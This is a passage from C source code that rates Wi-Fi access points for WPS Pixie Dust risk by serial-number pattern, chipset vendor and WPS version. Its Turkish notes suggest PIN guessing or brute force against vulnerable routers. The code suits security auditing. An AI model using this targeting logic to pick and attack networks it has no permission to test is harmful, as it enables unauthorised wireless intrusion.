    if (info.serial_number[0] != '\0') {
        if ((info.serial_number[0]=='Z' && info.serial_number[1]=='T') ||
            (info.serial_number[0]=='Z' && info.serial_number[1]=='X')) {
            info.pixie_risk = PIXIE_RISK_HIGH;
            strncpy(info.pixie_note, "ZTE serial deseni - serial bazli PIN (ZTEG/ZTER prefix)", 79);
            return;
        }
        // Huawei ONT seri formatı: "21..." ile başlayan uzun seriler
        if (info.serial_number[0]=='2' && info.serial_number[1]=='1' &&
            strlen(info.serial_number) >= 12) {
            info.pixie_risk = PIXIE_RISK_MEDIUM;
            strncpy(info.pixie_note, "Huawei ONT serial deseni - 21XXXXXX format, kismi acik", 79);
            return;
        }
    }

    // ── Chipset IE parmak izinden risk ataması ──────────────────────────────
    // WPS IE model string'inde eşleşme bulunamadıysa chipset OUI'na bak.
    // Ralink = yüksek Pixie Dust, Atheros/QCA = orta, Broadcom = düşük.
    if (info.chipset_ie_hint[0]) {
        const char *h = info.chipset_ie_hint;
        if (strstr(h, "Ralink")) {
            info.pixie_risk = PIXIE_RISK_HIGH;
            snprintf(info.pixie_note, 80,
                "Ralink chipset IE [%s] - kesin Pixie Dust, ZhaoXOR PIN", h);
            return;
        }
        if (strstr(h, "Atheros") || strstr(h, "Qualcomm")) {
            info.pixie_risk = is_v1 ? PIXIE_RISK_MEDIUM : PIXIE_RISK_LOW;
            snprintf(info.pixie_note, 80,
                "Qualcomm/Atheros chipset IE [%s] - PIN tahmini mumkun", h);
            return;
        }
        if (strstr(h, "MediaTek")) {
            info.pixie_risk = PIXIE_RISK_MEDIUM;
            snprintf(info.pixie_note, 80,
                "MediaTek chipset IE [%s] - orta Pixie Dust riski", h);
            return;
        }
        if (strstr(h, "Realtek")) {
            info.pixie_risk = PIXIE_RISK_MEDIUM;
            snprintf(info.pixie_note, 80,
                "Realtek chipset IE [%s] - orta risk, PIN deneme onerili", h);
            return;
        }
        if (strstr(h, "Broadcom")) {
            info.pixie_risk = PIXIE_RISK_LOW;
            snprintf(info.pixie_note, 80,
                "Broadcom chipset IE [%s] - dusuk Pixie Dust riski", h);
            if (is_v1) info.pixie_risk = PIXIE_RISK_MEDIUM; // v1.0 ise biraz daha yüksek
            return;
        }
        if (strstr(h, "Cisco")) {
            info.pixie_risk = PIXIE_RISK_LOW;
            snprintf(info.pixie_note, 80,
                "Cisco chipset IE [%s] - WPS genellikle guvenli", h);
            return;
        }
    }

    // ── WPS v1.0 ve bilinmeyen model → genişletilmiş orta risk ───────────
    if (is_v1) {
        info.pixie_risk = PIXIE_RISK_MEDIUM;
        strncpy(info.pixie_note, "WPS v1.0 + tanimsiz model - Pixie Dust riski var (brute force dene)", 79);
        return;
    }

    info.pixie_risk = PIXIE_RISK_UNKNOWN;
}
